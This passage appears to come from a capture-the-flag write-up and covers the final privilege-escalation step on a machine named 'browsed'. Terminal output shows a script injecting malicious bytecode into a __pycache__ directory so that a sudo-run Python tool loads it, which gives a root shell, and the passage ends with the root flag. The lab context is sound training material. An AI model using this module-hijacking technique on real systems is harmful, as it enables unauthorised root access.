After running our injection script, the malicious `Bytecode` was successfully placed in the `__pycache__` directory.

```shell
larry@browsed:/tmp/privesc$ python3 privesc.py 
[+] Bytecode injected
[+] Run: sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

When we executed the `extension_tool.py` script with `sudo`, it imported our malicious `Bytecode` instead of the legitimate `extension_utils` module. This resulted in our payload being executed as `root`, dropping us into a `root shell`.

```shell
larry@browsed:/tmp/privesc$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
root@browsed:/tmp/privesc#
```

## root.txt

```shell
root@browsed:~# cat root.txt 
ec2e82bcd7909545408bb3bb3f2b274e
```
